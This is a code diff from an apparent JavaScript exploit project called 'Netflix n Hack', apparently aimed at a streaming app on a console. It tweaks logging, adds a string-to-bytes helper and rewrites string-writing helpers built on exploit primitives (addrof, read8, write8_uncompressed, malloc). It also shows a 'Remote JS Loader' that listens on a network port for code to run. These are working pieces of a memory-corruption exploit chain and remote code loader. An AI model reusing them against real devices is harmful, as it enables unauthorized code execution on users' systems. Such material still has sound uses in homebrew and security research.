@@ -71,7 +71,7 @@ const logger = {
             
             w.text = {
                 contents: this.lines[i],
-                size: 12,
+                size: 10,
                 color: {
                     a: 255,
                     r: 0,
@@ -223,8 +223,17 @@ class gadgets {
     }
 }
 
+function stringToBytes (str) {
+  const len = str.length;
+  const bytes = new Uint8Array(len);
+  for (let i = 0; i < len; i++) {
+    bytes[i] = str.charCodeAt(i);
+  }
+  return bytes;
+}
+
 function main () {
-    
+
     logger.init();
     
     logger.log("=== Netflix n Hack ===");
@@ -892,22 +901,19 @@ function main () {
         const SO_REUSEADDR = 4n;
 
         function write_string(addr, str) {            
-            const add_of_str = addrof(str) + 12n;
+            let bytes = stringToBytes(str);
             for (let i = 0; i < str.length; i++) {
-                byte = read8(add_of_str + BigInt(i));
-                write8_uncompressed(addr + BigInt(i), byte);
+                write8_uncompressed(addr + BigInt(i), bytes[i]);
             }
             
             write8_uncompressed(addr + BigInt(str.length), 0);
         }
 
         function alloc_string(str) {
-            const add_of_str = addrof(str) + 12n;;
             const addr = malloc(str.length + 1); // Full 64bits Add
-            
+            let bytes = stringToBytes(str);
             for (let i = 0; i < str.length; i++) {
-                byte = read8(add_of_str + BigInt(i));
-                write8_uncompressed(addr + BigInt(i), byte);
+                write8_uncompressed(addr + BigInt(i), bytes[i]);
             }
             
             write8_uncompressed(addr + BigInt(str.length), 0);
@@ -1054,7 +1060,7 @@ function main () {
 
         let network_str = current_ip + ":" + port;
         logger.log("Remote JS Loader listening on " + network_str);
-        send_notification("Remote JS Loader Listening on " + network_str);
+        send_notification("Remote JS Loader\nListening on " + network_str);
 
         while (true) {
             try {
